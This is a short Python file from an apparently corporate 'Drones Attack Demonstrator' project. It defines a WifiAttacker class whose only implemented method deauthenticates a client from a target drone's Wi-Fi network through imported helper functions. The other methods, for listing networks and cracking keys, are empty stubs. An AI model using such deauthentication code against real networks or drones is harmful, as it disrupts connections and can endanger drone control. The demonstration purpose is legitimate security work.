#!/usr/bin/env python3
# -*- coding: utf-8 -*-

##############################################################################
# Owner     : Expleo Group
# Author    : Tarek AZAIZ
# Project   : Drones Attack Demonstrator
# Subject   : Deauthenticate a legitime user frome the target drone network
# Version   : 0.1
# Created   : 2022/03/31
# Modified  : 2022/05/04
##############################################################################

from . wifi_nw_tools import *
from ..config import *

class WifiAttacker():

    def __init__(self) -> None:
        pass

    
    def list_wifi_nw(self) -> None:
        pass


    def crack_key(self) -> None:
        pass


    def deauth_client(ap_bssid, cli_bssid, chan, essid
        , mng_interf=MNG_INTERF, mon_interf=MON_INTERF):
        restore_interf(mng_interf)
        start_mon(chan, mng_interf)
        deauth(ap_bssid, cli_bssid, essid, mon_interf)
        restore_interf(mng_interf)


    def connect():
        pass


def main():
    pass


if __name__ == "__main__":
    main()
